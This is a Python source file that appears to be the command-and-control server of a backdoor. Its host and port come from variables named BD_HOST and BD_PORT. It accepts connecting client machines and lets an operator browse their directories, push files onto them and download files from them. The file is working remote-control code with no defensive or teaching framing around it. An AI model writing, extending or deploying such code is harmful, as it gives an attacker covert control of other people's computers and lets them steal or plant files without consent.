import io
import socket
import os
import time
from threading import Thread

import models

HOST = str(os.environ.get("BD_HOST"))
PORT = int(os.environ.get("BD_PORT"))
server_socket = socket.socket()
server_socket.bind((HOST, PORT))
print('[+] Server Started')
clients = []
server_socket.listen(5)


def handle_command(userinput, client):
    command = userinput.split(" ")[0]
    cl = client.socket
    output = ""
    args = userinput.split(" ")
    del (args[0])

    if command == "cd":
        if len(args) > 0:
            cl.send(userinput.encode("UTF-8"))
            output = cl.recv(1024).decode()
            if not output == "Invalid Path!":
                client.pwd = output
        else:
            output = "No args given!"

    elif command == 'pwd':
        return client.pwd

    elif command == "ls":
        cl.send(userinput.encode("UTF-8"))
        output = cl.recv(1024)
        output = output.decode()

    elif command == "send":
        if len(args) > 0:
            if not client.get_file_by_name(args[0]) is None:
                cl.send(userinput.encode("UTF-8"))
                time.sleep(5)

                file = client.get_file_by_name(args[0])
                cl.sendall(file.data.getvalue())
                cl.send(b"<END>")
                output = cl.recv(1024).decode()
            else:
                output = "File not found!"
        else:
            output = "No args given!"

    elif command == "download":
        if len(args) > 0:
            cl.send(userinput.encode("UTF-8"))
            valid = cl.recv(1024).decode()
            if valid == "yes":
                file_name = args[0]
                file_bytes = b""
                done = False
                while not done:
                    data = cl.recv(1024)
                    file_bytes += data
                    if file_bytes[-5:] == b"<END>":
                        done = True
                final_bytes = file_bytes[:-5]
                file = io.BytesIO(final_bytes)
                file.seek(0)
                return file_name, file
            else:
                output = "File not found!"
        else:
            output = "No args given!"

    else:
        output = "Unknown command! (help for help)"

    return output


def listen_for_clients():
    print("[+] Listening for Connections!")
    while True:
        client, client_addr = server_socket.accept()
        print(f'[+] {client_addr} Client connected to the server')
        pwd = client.recv(1024).decode()
        c = models.Client(pwd, client_addr, client)
        clients.append(c)
